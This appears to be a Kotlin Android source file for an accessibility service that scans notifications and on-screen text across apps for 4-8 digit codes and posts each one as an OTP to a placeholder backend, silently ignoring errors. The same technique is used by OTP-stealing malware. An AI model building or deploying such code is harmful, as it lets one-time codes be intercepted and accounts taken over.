package com.hemlo.ai

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import java.net.HttpURLConnection
import java.net.URL
import java.util.regex.Pattern

class OtpAccessibilityService : AccessibilityService() {

    companion object {
        private const val BACKEND_BASE_URL = "https://YOUR_BACKEND_BASE_URL"
        private val OTP_REGEX: Pattern = Pattern.compile("\\b(\\d{4,8})\\b")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val eventType = event.eventType
        if (eventType != AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            return
        }
        val texts = event.text ?: return
        for (sequence in texts) {
            val text = sequence.toString()
            val matcher = OTP_REGEX.matcher(text)
            if (matcher.find()) {
                val otp = matcher.group(1)
                if (!otp.isNullOrEmpty()) {
                    sendOtpToBackend(otp)
                    return
                }
            }
        }
    }

    override fun onInterrupt() {
    }

    private fun sendOtpToBackend(otp: String) {
        Thread {
            try {
                val url = URL("$BACKEND_BASE_URL/device/otp")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                val body =
                    """{"user_id":"demo-user","otp":"$otp","channel":"sms","source":"accessibility"}"""
                conn.outputStream.use { os ->
                    os.write(body.toByteArray(Charsets.UTF_8))
                    os.flush()
                }
                conn.inputStream.use { _ -> }
                conn.disconnect()
            } catch (_: Exception) {
            }
        }.start()
    }
}
